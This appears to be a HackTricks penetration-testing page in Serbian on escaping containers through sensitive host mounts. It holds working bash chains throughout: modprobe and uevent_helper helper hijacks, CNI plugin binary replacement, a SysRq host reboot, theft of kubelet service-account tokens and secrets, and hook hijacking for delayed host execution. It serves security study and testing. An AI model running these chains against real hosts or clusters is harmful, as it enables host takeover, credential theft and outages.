# Osetljivi mount-ovi hosta

{{#include ../../../banners/hacktricks-training.md}}

## Pregled

Mount-ovi hosta predstavljaju jednu od najvažnijih praktičnih površina za bekstvo iz containera, jer često urušavaju pažljivo izolovani prikaz procesa i ponovo omogućavaju direktnu vidljivost resursa hosta. Opasni slučajevi nisu ograničeni na `/`. Bind mount-ovi za `/proc`, `/sys`, `/var`, runtime socket-e, stanje kojim upravlja kubelet ili putanje povezane sa uređajima mogu izložiti kontrole kernela, kredencijale, filesystem-e susednih containera i interfejse za upravljanje runtime-om.

Ova stranica postoji odvojeno od pojedinačnih stranica o zaštiti zato što je model zloupotrebe širi. Writable mount hosta je opasan delom zbog mount namespace-a, delom zbog user namespace-a, delom zbog pokrivenosti AppArmor-om ili SELinux-om, a delom zbog toga koja je tačna putanja hosta izložena. Posmatranje ove teme kao zasebne celine znatno olakšava analizu attack surface-a.

## Izloženost `/proc`-u

procfs sadrži i uobičajene informacije o procesima i kernel control interfejse visokog uticaja. Bind mount kao što je `-v /proc:/host/proc` ili prikaz containera koji izlaže neočekivane writable proc entries može zato dovesti do otkrivanja informacija, uskraćivanja usluge ili direktnog izvršavanja koda na hostu.

Važne procfs putanje uključuju:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc/` (posebno `register` i `status`)
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Zloupotreba

Započnite proverom toga koji su procfs entries visoke vrednosti vidljivi ili writable:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sys/fs/binfmt_misc/status \
/proc/sys/fs/binfmt_misc/register \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Ove putanje su interesantne iz različitih razloga. `core_pattern`, `modprobe` i `binfmt_misc` mogu postati putanje za izvršavanje koda na hostu kada su writable. `kallsyms`, `kmsg`, `kcore` i `config.gz` predstavljaju moćne izvore za reconnaissance tokom kernel exploitation-a. `sched_debug` i `mountinfo` otkrivaju kontekst procesa, cgroup-ova i filesystem-a, što može pomoći u rekonstrukciji rasporeda hosta iz kontejnera.

Praktična vrednost svake putanje je različita, a tretiranje svih njih kao da imaju isti uticaj otežava triage:

- `/proc/sys/kernel/core_pattern`
Ako je writable, ovo je jedna od najrizičnijih procfs putanja, jer će kernel izvršiti pipe handler nakon crash-a. Kontejner koji može da usmeri `core_pattern` na payload sačuvan u svom overlay-u ili na montiranoj host putanji često može da dobije izvršavanje koda na hostu. Pogledajte i [read-only-paths.md](protections/read-only-paths.md) za poseban primer.
- `/proc/sys/kernel/modprobe`
Ova putanja kontroliše userspace helper koji kernel koristi kada treba da pozove logiku za učitavanje modula. Ako je writable iz kontejnera i interpretira se u kontekstu hosta, može postati još jedan primitive za izvršavanje koda na hostu. Posebno je interesantna u kombinaciji sa načinom za trigger-ovanje helper putanje.
- `/proc/sys/vm/panic_on_oom`
Ovo obično nije čist escape primitive, ali može pretvoriti pritisak na memoriju u denial of service na nivou celog hosta, tako što OOM uslove pretvara u ponašanje kernel panic-a.
- `/proc/sys/fs/binfmt_misc`
Ako je registration interfejs writable, attacker može registrovati handler za izabranu magic vrednost i dobiti izvršavanje u kontekstu hosta kada se izvrši fajl koji joj odgovara.
- `/proc/config.gz`
Korisno za kernel exploit triage. Pomaže u utvrđivanju toga koji su subsystem-i, mitigation-i i opcionalne kernel funkcije omogućeni, bez potrebe za metadata-om host package-ova.
- `/proc/sysrq-trigger`
Uglavnom denial-of-service putanja, ali veoma ozbiljna. Može odmah reboot-ovati, izazvati panic ili na drugi način poremetiti rad hosta.
- `/proc/kmsg`
Otkriva poruke iz kernel ring buffer-a. Korisno je za fingerprinting hosta, analizu crash-a i, u nekim okruženjima, za leak informacija korisnih za kernel exploitation.
- `/proc/kallsyms`
Vredna je kada je readable, jer izlaže informacije o exported kernel simbolima i može pomoći u zaobilaženju pretpostavki o address randomization-u tokom razvoja kernel exploit-a.
- `/proc/[pid]/mem`
Ovo je direktan interfejs za memoriju procesa. Ako je ciljni proces dostupan uz neophodne ptrace-style uslove, može omogućiti čitanje ili izmenu memorije drugog procesa. Realni uticaj u velikoj meri zavisi od credentials-a, `hidepid`, Yama-e i ptrace ograničenja, pa je ovo moćna, ali uslovna putanja.
- `/proc/kcore`
Izlaže prikaz sistemske memorije u obliku core image-a. Fajl je ogroman i nezgodan za korišćenje, ali ako je smisleno readable, to ukazuje na ozbiljno izloženu površinu memorije hosta.
- `/dev/kmem` i `/dev/mem`
Ovo su istorijski veoma rizični interfejsi za sirovu memoriju tipa **device**, a ne procfs fajlovi. Na mnogim modernim sistemima ne postoje ili su strogo ograničeni, ali kontejner koji može da otvori host-mounted kopiju treba da tretira ovu izloženost kao kritičnu. Proverite ih zajedno sa drugim osetljivim `/dev` mount-ovima, umesto da tražite nepostojeće putanje `/proc/kmem` ili `/proc/mem`.
- `/proc/sched_debug`
Leak-uje informacije o scheduling-u i task-ovima, što može otkriti identitete procesa na hostu čak i kada drugi prikazi procesa izgledaju urednije nego što se očekuje.
- `/proc/[pid]/mountinfo`
Izuzetno je korisna za rekonstrukciju mesta na kojem se kontejner zaista nalazi na hostu, utvrđivanje toga koje su putanje podržane overlay-om i da li writable mount odgovara sadržaju hosta ili samo sloju kontejnera.

Ako su `/proc/[pid]/mountinfo` ili detalji overlay-a readable, iskoristite ih da pronađete host putanju filesystem-a kontejnera:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Ove komande su korisne zato što brojni host-execution trikovi zahtevaju pretvaranje putanje unutar container-a u odgovarajuću putanju iz perspektive host-a.

### Primer: Priprema `modprobe` Helper Putanje

Ako je `/proc/sys/kernel/modprobe` upisiv iz container-a, a helper putanja se interpretira u host kontekstu, može se preusmeriti na payload kojim upravlja attacker. Overlay upper direktorijum mora da se razreši sa host-a, a dokazni izlaz mora biti upisan nazad u isti host-visible container layer ako container takođe ne mount-uje host `/tmp`:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_modprobe=$(cat /proc/sys/kernel/modprobe)
cat > /tmp/modprobe-payload <<EOF
#!/bin/sh
id > "$host_path/tmp/modprobe.out"
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
# Run only an authorized, lab-specific helper trigger here.
cat /tmp/modprobe.out
printf '%s\n' "$original_modprobe" > /proc/sys/kernel/modprobe
```
Tačan okidač zavisi od cilja i ponašanja kernela i namerno se ne pogađa. Vratite originalnu vrednost pre napuštanja laboratorije. Važno je da putanja pomoćnog programa sa dozvolom upisivanja može da preusmeri buduće pozivanje kernel pomoćnog programa na sadržaj host putanje pod kontrolom napadača. Nedostajući overlay `upperdir`, putanja koju host ne može da razreši, read-only sysctl mount ili kernel koji nikada ne poziva izabrani pomoćni program prekidaju ovaj lanac.

### Full Example: Kernel Recon With `kallsyms`, `kmsg`, And `config.gz`

Ako je cilj procena exploitability-ja, a ne trenutni escape:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Ove komande pomažu da se utvrdi da li su korisne informacije o simbolima vidljive, da li nedavne kernel poruke otkrivaju zanimljivo stanje i koje su kernel funkcije ili mitigacije uključene prilikom kompajliranja. Uticaj obično nije direktan escape, ali može značajno skratiti triage kernel ranjivosti.

### Potpuni primer: SysRq ponovno pokretanje hosta

Ako je `/proc/sysrq-trigger` upisiv i pristupa host prikazu:
```bash
echo b > /proc/sysrq-trigger
```
Efekat je trenutno ponovno pokretanje hosta. Ovo nije suptilan primer, ali jasno pokazuje da izlaganje procfs-a može biti mnogo ozbiljnije od otkrivanja informacija.

## Izloženost `/sys`-u

sysfs izlaže velike količine informacija o stanju kernela i uređaja. Neke sysfs putanje su uglavnom korisne za fingerprinting, dok druge mogu uticati na izvršavanje pomoćnih programa, ponašanje uređaja, konfiguraciju security-modula ili stanje firmware-a.

Važne sysfs putanje uključuju:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Ove putanje su važne iz različitih razloga. `/sys/class/thermal` može uticati na ponašanje upravljanja temperaturom, a time i na stabilnost hosta u loše izloženim okruženjima. `/sys/kernel/vmcoreinfo` može leak-ovati informacije o crash-dump-u i rasporedu kernela, što pomaže pri low-level fingerprintingu hosta. `/sys/kernel/security` je `securityfs` interfejs koji koriste Linux Security Modules, pa neočekivani pristup može otkriti ili izmeniti stanje povezano sa MAC-om. EFI variable putanje mogu uticati na boot podešavanja podržana firmware-om, zbog čega su mnogo ozbiljnije od običnih konfiguracionih fajlova. `debugfs` pod `/sys/kernel/debug` je posebno opasan jer je namerno developerski interfejs, sa znatno manje bezbednosnih očekivanja nego hardenovani kernel API-ji namenjeni produkciji.

Svaki sysfs unos na ovoj listi zavisi od **kernela, konfiguracije i hardvera**. Aktuelni virtualizovani nodovi često u potpunosti izostavljaju `uevent_helper`, EFI variable i thermal-device unose. Odsutnu putanju zabeležite kao negativni preduslov, umesto da pretpostavite da se primer sa drugog kernela primenjuje.

Korisne komande za proveru ovih putanja su:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
Šta te komande čini zanimljivim:

- `/sys/kernel/security` može otkriti da li su AppArmor, SELinux ili druga LSM površina vidljivi na način koji je trebalo da ostane dostupnim samo hostu.
- `/sys/kernel/debug` je često najalarmantniji nalaz u ovoj grupi. Ako je `debugfs` montiran i može da se čita ili upisuje u njega, očekujte široku površinu usmerenu ka kernelu, čiji tačan rizik zavisi od omogućenih debug čvorova.
- Izlaganje EFI promenljivih je ređe, ali ima veliki uticaj jer dotiče podešavanja zasnovana na firmware-u, a ne obične datoteke tokom rada sistema.
- `/sys/class/thermal` je uglavnom relevantan za stabilnost hosta i interakciju sa hardverom, a ne za uredan shell-style escape.
- `/sys/kernel/vmcoreinfo` je pre svega izvor podataka za fingerprinting hosta i analizu padova, koristan za razumevanje stanja kernela na niskom nivou.

### Potpun primer: `uevent_helper`

`/sys/kernel/uevent_helper` zavisi od kernela i konfiguracije i nedostupan je na mnogim savremenim sistemima. Ako postoji, može da se menja i dostupan je upotrebljiv `uevent` trigger, kernel može da izvrši helper kojim upravlja napadač. Izlaz za dokaz mora da koristi putanju koja je vidljiva i iz perspektive hosta i iz perspektive containera:
```bash
[ -w /sys/kernel/uevent_helper ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_helper=$(cat /sys/kernel/uevent_helper)
cat > /evil-helper <<EOF
#!/bin/sh
id > "$host_path/output"
EOF
chmod +x /evil-helper
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
# This virtual-device path is a common lab trigger, but is not present everywhere.
uevent_file=/sys/class/mem/null/uevent
if [ ! -w "$uevent_file" ]; then
printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
echo "No writable, pre-approved uevent trigger was found" >&2
exit 1
fi
echo change > "$uevent_file"
cat /output
printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
```
Razlog zbog kog ovo funkcioniše jeste to što se putanja helper-a tumači iz perspektive host-a. Kada se aktivira, helper se izvršava u kontekstu host-a, a ne unutar trenutnog container-a. `/sys/class/mem/null/uevent` je jedan konkretan trigger na kernel-ima koji ga izlažu; drugi uređaji mogu izlagati sopstvene `uevent` fajlove, ali nemojte naslepo birati jedan na stvarnom hardveru. Vratite originalnu vrednost pre napuštanja lab-a. Nemojte prijavljivati ovu tehniku kao dostupnu ako helper fajl ili kontrolisani trigger ne postoji.

## Izlaganje `/var` direktorijuma

Montiranje host-ovog `/var` direktorijuma u container često se potcenjuje jer ne izgleda tako dramatično kao montiranje `/`. U praksi to može biti dovoljno za pristup runtime socket-ima, container snapshot direktorijumima, kubelet-om upravljanim pod volume-ima, projektovanim service-account tokenima i filesystem-ima susednih aplikacija. Na modernim node-ovima, `/var` je često mesto na kom se zapravo nalazi najzanimljivije operativno stanje container-a.

### Kubernetes primer

Pod sa `hostPath: /var` često može da čita projektovane tokene drugih pod-ova i sadržaj overlay snapshot-a:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Ove komande su korisne jer pokazuju da li mount izlaže samo beznačajne podatke aplikacije ili akreditive klastera visokog uticaja. Čitljiv service-account token može odmah pretvoriti lokalno izvršavanje koda u pristup Kubernetes API-ju.

Ako je token prisutan, proverite čemu može da pristupi umesto da se zaustavite na otkrivanju tokena:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
Uticaj ovde može biti mnogo veći od lokalnog pristupa nodu. Token sa širokim RBAC ovlašćenjima može pretvoriti mountovan `/var` u kompromitaciju celog clustera.

### Docker And containerd Primer

Na Docker hostovima relevantni podaci se često nalaze u `/var/lib/docker`, dok se na Kubernetes nodovima zasnovanim na containerd-u mogu nalaziti u `/var/lib/containerd` ili putanjama specifičnim za snapshotter:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Ako montirani `/var` izlaže sadržaj snapshot-a druge workload instance koji može da se menja, napadač može da izmeni datoteke aplikacije, postavi web sadržaj ili promeni startup skripte bez dodirivanja trenutne konfiguracije container-a.

Na **disposable lab workload-u**, sadržaj snapshot-a koji može da se menja može demonstrirati tampering aplikacije, oporavak secrets-a ili lateral movement. Prvo mapirajte runtime container ID na tačan snapshot i nikada ne menjajte nepovezani ili production snapshot:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f \( -path '*/.ssh/*' -o -path '*/authorized_keys' \) 2>/dev/null | head -n 20
```
Ove komande su korisne jer prikazuju tri glavne grupe uticaja montiranog `/var`: neovlašćeno menjanje aplikacija, preuzimanje tajni i lateralno kretanje ka susednim workload-ima.

Direktno upisivanje snapshot-a zaobilazi uobičajeno upravljanje stanjem runtime-a i može oštetiti container ili uništiti dokaze. Read-only otkrivanje je lokalno ponovljeno nad Docker `overlay2`: marker upisan u susednom disposable container-u pojavio se ispod `/var/lib/docker/overlay2/<id>/diff/`. Stvarne izmene snapshot-a treba ograničiti na disposable container kreiran za taj test.

## Kubelet State, Plugins And CNI Paths

Mount `/var/lib/kubelet`, `/opt/cni/bin` ili `/etc/cni/net.d` često je izložen kroz privilegovane DaemonSet-ove, CNI agente, CSI node plugin-e, GPU operatore i storage pomoćne komponente. Ovi mount-ovi se lako mogu odbaciti kao "node plumbing", ali se nalaze direktno u izvršnom toku za nove pod-ove i često sadrže kubelet credentials, projected secrets, registration socket-e i izvršne plugin binary-je na host-u.

Ciljevi visoke vrednosti obuhvataju:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Korisne komande za pregled su:
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
Zašto su ove putanje važne:

- `/var/lib/kubelet/pki` može otkriti kubelet klijentske sertifikate i druge lokalne akreditive čvora koji se ponekad mogu ponovo iskoristiti protiv API servera ili TLS endpointa dostupnih kubeletu, u zavisnosti od dizajna klastera.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/pods` često sadrži projektovane service-account tokene i montirane Secrets za susedne podove na istom čvoru.
- `/var/lib/kubelet/pod-resources/kubelet.sock` je uglavnom površina za reconnaissance, ali veoma korisna: otkriva koji podovi i kontejneri trenutno koriste GPU-ove, hugepages, SR-IOV uređaje i druge oskudne lokalne resurse čvora.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` i `/var/lib/kubelet/plugins_registry` otkrivaju koji su CSI, DRA i device plugins instalirani i sa kojim socketima kubelet treba da komunicira. Ako su ti direktorijumi upisivi, a ne samo čitljivi, nalaz postaje mnogo ozbiljniji.<sup>[[1]](#references)</sup>
- `/opt/cni/bin` i `/etc/cni/net.d` nalaze se direktno na putanji za podešavanje pod-mreže. Upisiv pristup tamo često predstavlja odloženi mehanizam za izvršavanje na hostu, a ne samo izlaganje konfiguracije.<sup>[[2]](#references)</sup>

### Kompletan primer: Upisiv `/opt/cni/bin`

Ako je direktorijum host CNI binarnih datoteka montiran uz dozvolu čitanja i upisivanja, zamena plugina može biti dovoljna za dobijanje izvršavanja na hostu kada kubelet sledeći put kreira sandbox poda na tom čvoru:<sup>[[2]](#references)</sup>
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > "$(dirname "$0")/.cni-triggered"
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
cat "$(dirname "$plugin")/.cni-triggered"
mv "${plugin}.orig" "$plugin"
rm -f "$(dirname "$plugin")/.cni-triggered"
```
Ovo nije tako neposredno kao montirani `docker.sock`, ali je često realističnije u kompromitovanim Kubernetes infrastructure podovima. Marker se upisuje pored montiranog plugina kako bi kontejner mogao da ga preuzme čak i bez host-root ili host-`/tmp` mounta. Wrapper čuva originalne argumente i standardni ulaz, nakon čega primer vraća originalni binary. Važno je to što modified binary kasnije izvršava host network setup flow, a ne trenutni kontejner. Koristite samo disposable node, jer neispravan wrapper može sprečiti da novi Pod sandboxes dobiju networking.

## Runtime Sockets

Sensitive host mountovi često uključuju runtime sockete umesto čitavih direktorijuma. Oni su toliko važni da zaslužuju eksplicitno ponavljanje ovde:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Pogledajte [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) za kompletne exploitation tokove kada se jedan od ovih socket-a mountuje.

Kao brzi obrazac za početnu interakciju:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Ako jedan od ovih postupaka uspe, putanja od "mounted socket" do "start a more privileged sibling container" obično je mnogo kraća od bilo koje kernel breakout putanje.

## Writable Host Path Task Hijack

Upisivi host mount ne mora da izlaže `/` da bi bio opasan. Ako montirana putanja sadrži skripte, config datoteke, hooks, plugins ili datoteke koje kasnije koristi scheduled task ili service na hostu, container možda može da promeni ono što host izvršava.

Generički tok pregleda:
```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```
Ako host proces koristi datoteku u koju je moguće upisivati, tokom testiranja payload neka bude jednostavan i uočljiv:
```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```
Zanimljiv deo je granica poverenja: upis se obavlja iz kontejnera, ali se izvršavanje dešava kasnije u kontekstu host servisa. To pretvara uski `hostPath` ili bind mount u primitivu za odloženo izvršavanje koda na hostu.

## CVE-ovi povezani sa mountovima

Host mountovi takođe dolaze u dodir sa ranjivostima runtime-a. Važni noviji primeri obuhvataju:

- `CVE-2024-21626` u `runc`-u, gde je procureli file descriptor direktorijuma mogao da postavi radni direktorijum na filesystem hosta.
- `CVE-2024-23651`, `CVE-2024-23652` i `CVE-2024-23653` u BuildKit-u, gde su zlonamerni Dockerfile-ovi, frontend-i i `RUN --mount` tokovi mogli ponovo da omoguće pristup fajlovima hosta, njihovo brisanje ili povišene privilegije tokom buildova.
- `CVE-2024-1753` u Buildah i Podman build tokovima, gde su posebno napravljeni bind mountovi tokom builda mogli da izlože `/` sa read-write pristupom.
- `CVE-2025-47290` u `containerd` 2.1.0, gde je TOCTOU tokom raspakivanja image-a mogao da omogući posebno napravljenom image-u da izmeni filesystem hosta tokom pull-a.

Ovi CVE-ovi su ovde važni jer pokazuju da rukovanje mountovima nije samo pitanje konfiguracije operatora. Sam runtime takođe može da uvede uslove za escape zasnovane na mountovima.

## Provere

Koristite sledeće komande da brzo pronađete mount izloženosti najveće vrednosti:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 -type s \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Šta je ovde interesantno:

- Host root, `/proc`, `/sys`, `/var` i runtime sockets su nalazi visokog prioriteta.
- Writable proc/sys entries često znače da mount izlaže host-global kernel kontrole, a ne bezbedan container prikaz.
- Mountovani `/var` paths zahtevaju proveru credentiala i susednog workload-a, a ne samo filesystem proveru.
- Kubelet state directories i CNI/plugin paths zaslužuju isti prioritet kao runtime sockets, jer se često nalaze direktno na node-ovoj putanji za kreiranje podova i distribuciju credentiala.

## Status lokalne validacije

Praktični chain-ovi na ovoj stranici provereni su na lokalnom Linux minikube node-u. Validacija je reprodukovala:

- read i write access kroz privremeni writable hostPath
- otkrivanje projektovanih ServiceAccount tokena i mountovanih Secrets kroz `/var/lib/kubelet/pods`
- uspešnu Kubernetes API autentikaciju pomoću aktivnog tokena pronađenog u tom mountovanom kubelet state-u
- read-only otkrivanje susednog Docker `overlay2` filesystem-a kroz mountovani `/var`
- kreiranje sibling containera putem Docker API-ja, sa read-only host bind-om kroz mountovani `docker.sock`
- odloženo izvršavanje na hostu putem privremenog host-consumed hook-a
- simulaciju CNI-wrapper-a koja je sačuvala argumente originalnog plugin-a, standardni input i izvršavanje

Isti node je izložio `core_pattern`, `modprobe`, `binfmt_misc/register`, `kallsyms`, `kcore` i `config.gz`, ali nije izložio `uevent_helper`, EFI variables, thermal entries niti `sched_debug`. Destructive kernel triggers nisu izvršeni. Ovo potvrđuje da su chain-ovi za host-root, `/var`, kubelet-state, socket i host-consumer reproduktibilni, dok procfs/sysfs helper tehnike moraju ostati uslovne u zavisnosti od tačnog kernel-a, mount mode-a, payload path-a i trigger-a.

## References

- [1] [Lokalni fajlovi i putanje koje koristi Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [2] [cilium-agent container može da pristupi hostu putem `hostPath` mount-a](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
